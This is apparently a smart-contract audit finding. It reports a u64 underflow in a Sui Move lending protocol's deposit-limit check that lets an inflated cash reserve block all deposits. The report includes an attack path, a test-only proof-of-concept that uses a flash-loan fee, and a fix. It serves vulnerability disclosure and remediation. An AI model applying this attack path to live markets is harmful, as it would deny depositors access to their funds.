### `deposit_limit_breached` u64 Underflow Aborts and Blocks All Deposits

Any user will be unable to deposit into an affected market, causing a DoS for all depositors

### Summary

u64 arithmetic underflow in `deposit_limit_breached` will cause a denial of service for all depositors as any deposit attempt will abort when accumulated `cash_reserve` exceeds `total_deposit_plus_interest + increment`

### Root Cause

In [`reserve.move:87-90`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/reserve.move#L87-L90) the `deposit_limit_breached` function uses u64 arithmetic that underflows and aborts when `cash_reserve.ceil()` exceeds `total_deposit_plus_interest.ceil() + increment`:

```move
public(package) fun deposit_limit_breached<MarketType>(self: &Reserve<MarketType>, increment: u64, limit: u64): bool {
    let total_deposit_plus_interest = self.total_deposit_plus_interest();
    total_deposit_plus_interest.ceil() + increment - self.cash_reserve.ceil() > limit
}
```

This is u64 arithmetic. If `self.cash_reserve.ceil()` exceeds `total_deposit_plus_interest.ceil() + increment`, the subtraction causes a u64 underflow, which in Sui Move aborts the transaction. Since `deposit_limit_breached` is called in `handle_mint` (`market.move:278`), all new deposits are blocked.

### Internal Pre-conditions

1. [Protocol operation needs to accrue fees to set] `cash_reserve` to be at least `total_deposit_plus_interest + 1` (accumulated from reserve_factor interest and flash loan fees)
2. [Depositors need to withdraw to set] `total_supply` to be at most a small value so that `total_deposit_plus_interest` falls below `cash_reserve`

### External Pre-conditions

None.

### Attack Path

1. Protocol accumulates 2,500 units of `cash_reserve` from interest and flash loan fees.
2. Depositors withdraw until `total_deposit_plus_interest` = 2,000.
3. New user tries to deposit 100 tokens.
4. `deposit_limit_breached` computes: `2000 + 100 - 2500` = underflow (u64).
5. Transaction aborts, blocking all new deposits.
6. Deposits remain blocked until admin calls `take_revenue` to drain `cash_reserve`.

### Impact

The depositors suffer a complete inability to deposit into the affected market. New deposits are blocked until an admin calls `take_revenue` to drain `cash_reserve`. Markets with high flash loan activity and low remaining deposits can become deposit-locked, preventing new liquidity from entering.

### PoC

**File:** `poc_041_deposit_limit_underflow.move`
```move
// PoC for Report #041: deposit_limit_breached u64 Underflow Blocks All Deposits
//
// Target: contracts/protocol/sources/internal/market/reserve.move:87-89
// Place in: contracts/protocol/sources/internal/market/ (or tests/ directory)
// Run:   sui move test --filter poc_041

#[test_only]
module protocol::poc_041_deposit_limit_underflow {
    use protocol::reserve;

    public struct PoCMarket {}
    public struct PoCCoin {}

    /// Proves that deposit_limit_breached aborts with u64 underflow when
    /// cash_reserve exceeds total_deposit_plus_interest + increment.
    ///
    /// The buggy formula:
    ///   total_deposit_plus_interest.ceil() + increment - cash_reserve.ceil() > limit
    ///
    /// When cash_reserve > total_deposit_plus_interest + increment, the subtraction
    /// underflows u64, causing an unconditional abort that blocks ALL deposits
    /// regardless of the configured limit.
    ///
    /// Setup:
    ///   deposit 1000, then flash loan with 2000 fee → cash_reserve = 2000
    ///   total_deposit_plus_interest = (3000+0-2000)/1000 * 1000 = 1000
    ///   Check: 1000 + 10 - 2000 → u64 UNDERFLOW → ABORT
    ///
    /// The test PASSES (via #[expected_failure]) because the abort IS the bug —
    /// a legitimate 10-token deposit is blocked even though the limit is 999M.
    #[test]
    #[expected_failure]
    fun test_deposit_blocked_by_underflow() {
        let admin = @0xAD;
        let mut scenario_value = sui::test_scenario::begin(admin);
        let ctx = scenario_value.ctx();
        let mut reserve = reserve::new<PoCMarket, PoCCoin>(ctx, 0);

        // Step 1: Deposit 1000 tokens
        let coin = sui::balance::create_for_testing<PoCCoin>(1000).into_coin(ctx);
        let _ctokens = reserve.mint_ctokens<PoCMarket, PoCCoin>(coin);
        // State: cash=1000, supply=1000, cash_reserve=0

        // Step 2: Flash loan with large fee to inflate cash_reserve
        //   borrow 1 token, repay with 2000 fee → cash_reserve += 2000
        let (flash_balance, loan) = reserve.borrow_flash_loan<PoCMarket, PoCCoin>(1);
        let repay_coin = sui::balance::create_for_testing<PoCCoin>(1).into_coin(ctx);
        let fee_coin = sui::balance::create_for_testing<PoCCoin>(2000).into_coin(ctx);
        reserve.repay_flash_loan(loan, repay_coin, fee_coin);
        sui::balance::destroy_for_testing(flash_balance);
        // State: cash=3000, supply=1000, cash_reserve=2000
        // exchange_rate = (3000+0-2000)/1000 = 1.0
        // total_deposit_plus_interest = 1000

        // Step 3: deposit_limit_breached → u64 UNDERFLOW
        //   1000 + 10 - 2000 = -990 → ABORT
        //   A tiny 10-token deposit is blocked despite limit being 999M
        let _ = reserve.deposit_limit_breached(10, 999_999_999);

        // Never reached — cleanup for compiler
        std::unit_test::destroy(_ctokens);
        std::unit_test::destroy(reserve);
        scenario_value.end();
    }
}
```

### Mitigation

Use saturating subtraction or reorder the arithmetic to avoid underflow:

```move
public(package) fun deposit_limit_breached<MarketType>(self: &Reserve<MarketType>, increment: u64, limit: u64): bool {
    let total_deposit_plus_interest = self.total_deposit_plus_interest();
    let deposit_ceil = total_deposit_plus_interest.ceil();
    let reserve_ceil = self.cash_reserve.ceil();

    // Avoid underflow: if reserve exceeds deposits, limit is not breached
    if (reserve_ceil >= deposit_ceil + increment) {
        return false
    };

    deposit_ceil + increment - reserve_ceil > limit
}
```
